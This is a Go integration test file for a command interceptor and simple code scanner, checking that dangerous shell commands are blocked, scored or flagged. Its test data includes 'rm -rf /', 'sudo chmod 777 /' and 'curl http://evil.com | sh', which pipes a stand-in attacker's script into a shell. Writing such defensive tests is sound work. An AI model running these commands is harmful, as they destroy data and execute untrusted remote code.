//go:build integration

package security

import (
	"strings"
	"testing"
)

func TestInterceptorWithVariousCommands(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"safe command", "ls -la", false},
		{"dangerous rm", "rm -rf /", true},
		{"curl pipe sh", "curl http://evil.com | sh", true},
		{"sudo chmod", "sudo chmod 777 /", true},
		{"normal git", "git status", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			i := New(config.SecurityConfig{DangerousOpsConfirm: false})
			allowed, err := i.Allow(tt.command)
			if tt.wantErr && err == nil {
				t.Errorf("expected error for command %q", tt.command)
			}
			if !tt.wantErr && !allowed {
				t.Errorf("expected command %q to be allowed", tt.command)
			}
		})
	}
}

func TestInterceptorWithConfirmation(t *testing.T) {
	t.Parallel()
	i := New(config.SecurityConfig{DangerousOpsConfirm: true})

	_, err := i.Allow("curl http://example.com")
	if err == nil {
		t.Error("expected confirmation required error for curl command")
	}
	if !strings.Contains(err.Error(), "confirmation") {
		t.Errorf("expected confirmation message, got: %v", err)
	}
}

func TestPatternMatching(t *testing.T) {
	t.Parallel()
	tests := []struct {
		command string
		minScore int
	}{
		{"rm -rf /", 91},
		{"curl http://example.com", 40},
		{"sudo ls", 30},
		{"ls -la", 0},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			score := calculateScore(tt.command)
			if score < tt.minScore {
				t.Errorf("expected score >= %d for %q, got %d", tt.minScore, tt.command, score)
			}
		})
	}
}

func TestSASTScanner(t *testing.T) {
	t.Parallel()
	code := `import os
os.system("rm -rf /")
`
	findings := scanCode(code)
	if len(findings) == 0 {
		t.Error("expected SAST findings for dangerous code")
	}
}

func scanCode(code string) []Finding {
	var findings []Finding
	if strings.Contains(code, "os.system") {
		findings = append(findings, Finding{
			Rule:    "dangerous-os-system",
			Message: "Use of os.system is dangerous",
		})
	}
	if strings.Contains(code, "rm -rf /") {
		findings = append(findings, Finding{
			Rule:    "dangerous-rm",
			Message: "Dangerous rm command detected",
		})
	}
	return findings
}
